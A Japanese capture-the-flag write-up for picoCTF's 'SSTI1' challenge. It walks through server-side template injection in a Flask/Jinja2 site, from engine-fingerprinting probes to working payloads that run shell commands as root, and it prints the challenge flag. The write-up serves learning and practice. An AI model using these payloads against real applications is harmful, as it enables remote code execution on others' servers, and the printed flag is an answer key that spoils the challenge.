    問題¶

    リンク: https://learn.cylabacademy.org/library/492 問題名: SSTI1 説明: I made a cool website where you can announce whatever you want! Try it out!

    解答までの道筋¶

    1. server side template injectionを使う問題っぽい
    2. 詳しく調べる。
    3. テンプレートエンジンがわからないので、いくつかの入力値を試す。
    4. {{7*7}} で49が出力されたので、Jinja2 / Twig / Nunjucks あたりがあやしい
    5. {{7*'7'}}で7777777が表示されたので、pythonのjinja2っぽい
    6. {{config}} でflaskの設定のぞけた
    7. {{ ''.__class__.__mro__ }} -> (<class 'str'>, <class 'object'>)
    8. {{ ''.__class__.__mro__[1].__subclasses__() }}
    9. {{ lipsum.__globals__['os'].popen('id').read() }} -> uid=0(root) gid=0(root) groups=0(root)
    10. ls -la実行したらflgってファイルがあった
    11. {{ lipsum.__globals__['os'].popen('cat flag').read() }}
    12. あった。picoCTF{s4rv3r_s1d3_t3mp14t3_1nj3ct10n5_4r3_c001_4675f3fa}

    学んだこと¶

    • 様々な入力値を試して、
    • XSS・SSTI・SQLiなど、どれで攻められるか考える
    • どんな技術（言語・フレームワーク・ライブラリ・テンプレートエンジン）が使われているか絞る。
    • RCE（Remote Code Execution）を試みる
    • テンプレートエンジンの特定でつかえる入力値
    {{7*7}}       → 49ならJinja2/Twig/Nunjucks系
${7*7}        → 49ならFreeMarker/Velocity系、JSのテンプレートリテラル
<%= 7*7 %>    → 49ならERB
#{7*7}        → 49ならRuby式展開/Slim等
{7*7}         → 一部エンジン
${{<%[%'"}}%\  → ポリグロット。エラーの出方でエンジン推測
